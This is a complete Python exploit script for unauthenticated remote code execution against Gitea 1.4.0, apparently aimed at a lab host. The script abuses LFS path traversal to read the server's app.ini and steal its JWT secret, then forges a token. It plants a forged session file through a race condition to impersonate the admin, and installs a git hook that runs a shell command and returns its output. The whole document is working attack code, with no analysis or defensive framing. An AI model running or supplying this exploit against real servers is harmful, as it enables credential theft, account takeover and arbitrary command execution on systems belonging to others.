# pip install PyJWT requests
# pip install dulwich==0.19.0
from requests import Request, Session, get, post
import jwt
import time
import base64
import os
import re
import time
import threading
import random
import string
import urlparse
import urllib
from dulwich import porcelain

print "Gitea 1.4.0"
print "Unauthenticated Remote Code Execution"
print "by Kacper Szurek"
print "https://security.szurek.pl/"
print "https://twitter.com/KacperSzurek"
print "https://www.youtube.com/c/KacperSzurek"

def decode_base64(data):
    missing_padding = len(data) % 4
    if missing_padding != 0:
        data += '='* (4 - missing_padding)
    return base64.urlsafe_b64decode(data)

def get_random():
	return ''.join(random.choice(string.lowercase) for x in range(6))

def get_csrf(path):
	temp = s.get("{}{}".format(url, path))

	content = temp.text.encode("utf-8")

	csrf = re.search('name="_csrf" content="([^"]+)"', content)

	if not csrf:
		print "[-] Cannot get CSRF token"
		os._exit(0)

	return csrf.group(1)

command = "whoami"
url = 'http://10.10.10.225:3000/'
session_value = '11session'

r = get('{}api/v1/repos/search?limit=1'.format(url))
try:
	out = r.json()['data']
except:
	print "[-] Probably not gitea url"
	os._exit(0)

if len(out) != 1:
	print "[-] There is no public repos"
	os._exit(0)

out = out[0]

public_repo_id = int(out['id'])
public_user_id = int(out['owner']['id'])
public_repo_url = out['full_name']

print "[+] Found public repo {} ID {}".format(public_repo_url, public_repo_id)

json = {
	"Oid": "....custom/conf/app.ini",
	"Size": 1000000, # This needs to be bigger than file
	"User" : "a",
	"Password" : "a",
	"Repo"  : "a",
	"Authorization" : "a"
}

s = Session()

r  = s.post('{}{}.git/info/lfs/objects'.format(url, public_repo_url), json=json, headers={'Accept': 'application/vnd.git-lfs+json'})
if '"Unauthorized"' not in r.text or '"expires_at"' not in r.text:
	print "[-] Cannot create fake OID for app.ini"
	os._exit(0)

print "[+] Fake OID for app.ini created"

r = get(r'{}{}.git/info/lfs/objects/....custom%2fconf%2fapp.ini/sth'.format(url, public_repo_url))

if "RUN_USER" not in r.text:
	print "[-] Cannot get app.ini"
	os._exit(0)


secret_match = re.search('LFS_JWT_SECRET *= *(.*?)[\r\n]', r.text)
if not secret_match:
	print "[-] Cannot find JWT secret in app.ini"
	os._exit(0)

jwt_secret = str(secret_match.group(1).strip())
print "[+] Found secret: {}-".format(jwt_secret)
jwt_secret = decode_base64(jwt_secret)

# This needs to be INT, not STR
current_time = int(time.time())-(60*60*24*1000)
current_time2 = int(time.time())+(60*60*24*1000)
token = jwt.encode({'user': public_user_id, 'repo': public_repo_id, 'op': 'upload', 'exp': current_time2, 'nbf': current_time}, jwt_secret, algorithm='HS256')

print "[+] Generate jwt token for user {} and repo {}".format(public_user_id, public_repo_id)
print token

json['Oid'] = '....data/sessions/1/1/{}'.format(session_value)

r  = s.post('{}{}.git/info/lfs/objects'.format(url, public_repo_url), json=json, headers={'Accept': 'application/vnd.git-lfs+json'})
if '"Unauthorized"' not in r.text or '"expires_at"' not in r.text:
	print "[-] Cannot create fake OID for session"
	os._exit(0)

print "[+] Fake OID for session created"

def race_condition_thread():
	print "\n[+] Race condition thread started"
	ts = Session()
	req = Request('PUT', r'{}{}.git/info/lfs/objects/....data%2fsessions%2f1%2f1%2f{}'.format(url, public_repo_url, session_value) , data=open('session.tmp', "rb").read())
	prepped = req.prepare()
	# We need to set explicit big content length for race condition
	prepped.headers['Content-Length'] = 150000
	prepped.headers['Accept'] = 'application/vnd.git-lfs'
	prepped.headers['Content-Type'] = 'application/vnd.git-lfs'
	prepped.headers['Authorization'] = 'Bearer {}'.format(token)
	# This will hang because of big Content-Length
	response = ts.send(prepped)
	print "\n[-] Race condition thread ended before exploit finish, try again"

thread = threading.Thread(target=race_condition_thread, args=())
thread.daemon = True
thread.start()
print "\n[+] Sleep 5 seconds"
time.sleep(5)

print "[+] Try using fake cookie: {}".format(session_value)

s = Session()
s.headers.update({'Cookie': 'i_like_gitea={}.tmp;'.format(session_value)})

r = s.get('{}api/v1/user'.format(url))
data = r.json()

if not "id" in data or data['id'] != 1:
	print "[-] Impersonation failed"
	os._exit(0)

user_name = data['login']
user_id = data['id']

print "[+] Login as {} ID {}".format(user_name, user_id)

csrf = get_csrf('user/settings/applications')
post_token = s.post('{}user/settings/applications'.format(url), data={'_csrf':csrf, 'name':get_random()}, allow_redirects=False)

try:
	login_token = post_token.cookies['macaron_flash']
	login_token = dict(urlparse.parse_qsl(urllib.unquote(login_token)))
	login_token = login_token['info']
except:
	print "[-] Cannot create token"
	os._exit(0)

print "[+] Login token: {}".format(login_token)

csrf = get_csrf('repo/create')
admin_repo_name = get_random()

print "[+] Try create repo {}".format(admin_repo_name)

repo_post = s.post("{}repo/create".format(url), data={'_csrf':csrf, 'uid':user_id, 'repo_name':admin_repo_name, 'readme': 'Default', 'auto_init':'on'}, allow_redirects=False)

if repo_post.status_code != 302:
	print "[-] Cannot create admin repo"
	os._exit(0)

csrf = get_csrf('{}/{}/settings/hooks/git/update'.format(user_name, admin_repo_name))
hook_posts = s.post('{}{}/{}/settings/hooks/git/update'.format(url, user_name, admin_repo_name), data={'_csrf':csrf, 'content':"#!/bin/sh\n{}>objects/info/exploit".format(command)}, allow_redirects=False)

if hook_posts.status_code != 302:
	print "[-] Cannot updatehook"
	os._exit(0)

clone_url = '{}{}:{}@{}{}/{}.git'.format(url[0:7], login_token, "", url[7:], user_name, admin_repo_name)

temp_repo_dir = get_random()
r = porcelain.clone(clone_url, temp_repo_dir)
porcelain.commit(r, get_random())
porcelain.push(r, clone_url, "master")

command_output = s.get('{}{}/{}/objects/info/exploit'.format(url, user_name, admin_repo_name))
if command_output.status_code != 200:
	print "[-] Cannot get exploit output"
	os._exit(0)
	
print command_output.text.encode("utf-8")
